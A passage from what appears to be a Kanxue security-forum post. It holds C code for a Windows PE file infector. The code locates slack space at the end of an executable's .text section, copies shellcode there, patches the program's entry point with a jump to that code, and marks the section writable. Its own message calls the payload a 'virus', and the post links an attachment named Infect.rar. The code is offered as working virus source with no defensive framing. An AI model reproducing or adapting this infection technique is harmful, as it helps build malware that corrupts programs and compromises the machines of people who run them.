
```c
// get NT hdr and do sanity checking

p_nt_hdr = (PIMAGE_NT_HEADERS)((char *)p_dos_hdr + p_dos_hdr->e_lfanew);

if ( p_nt_hdr->Signature != IMAGE_NT_SIGNATURE) {
    printf("invalid PE file, no NT signature found\n");
    goto err3;
}

// get other hdrs
p_file_hdr = &p_nt_hdr->FileHeader;
p_opt_hdr = &p_nt_hdr->OptionalHeader;
p_sect_hdr = (PIMAGE_SECTION_HEADER)((char *)p_nt_hdr + sizeof(IMAGE_NT_HEADERS));

// get text section room
for ( i=0; i<p_file_hdr->NumberOfSections; i++, p_sect_hdr++) {
    if ( !stricmp( ".text", p_sect_hdr->Name)) {
        room = p_opt_hdr->FileAlignment - (p_sect_hdr->Misc.VirtualSize % p_opt_hdr->FileAlignment);
        break;
    }
}

if ( room < sizeof(sc_size)) {
    printf("insufficient room for virus.\n");
    goto err3;
}

printf( "room = %08x\n", room);
printf("lfanew offset: %08x\n", (char *)&p_dos_hdr->e_lfanew - (char *)p_dos_hdr);
printf("opt-hdr offset: %08x\n", (char *)&p_nt_hdr->OptionalHeader - (char *)p_nt_hdr);
printf("entry offset: %08x\n", (char *)&p_opt_hdr->AddressOfEntryPoint - (char *)p_opt_hdr);
printf("exp offset: %08x\n", (char *)&(p_opt_hdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]) - (char *)p_opt_hdr);

p_entry = (char *)p_mem + p_sect_hdr->PointerToRawData + (p_opt_hdr->AddressOfEntryPoint - p_sect_hdr->VirtualAddress);
p_te = (char *)p_mem + p_sect_hdr->PointerToRawData + p_sect_hdr->Misc.VirtualSize;

off = *((unsigned long *)((char *)shellcode + 1));
p_tmp = ((char *)shellcode + off + 5);

memcpy( p_te, p_tmp, sc_size);
memcpy( p_te+8, p_entry, 5);

// create jmp struct
off = p_te - p_entry - 5;
*((unsigned long *)(jmp_ins + 1)) = off;
memcpy( p_entry, jmp_ins, 5);

p_sect_hdr->Characteristics |= 0x80000000;

printf("%08x\n", sizeof(IMAGE_FILE_HEADER));

err3:
    UnmapViewOfFile(p_mem);
err2:
    CloseHandle(h_fmapping);
err1:
    CloseHandle( h_file);
err0:
    return FALSE;
}
```

[传递专业知识、拓宽行业人脉——看雪讲师团队等你加入！！](https://bbs.kanxue.com/thread-275828.htm)

上传的附件：

- [Infect.rar](javascript:void(0);)（184.46kb，173次下载）
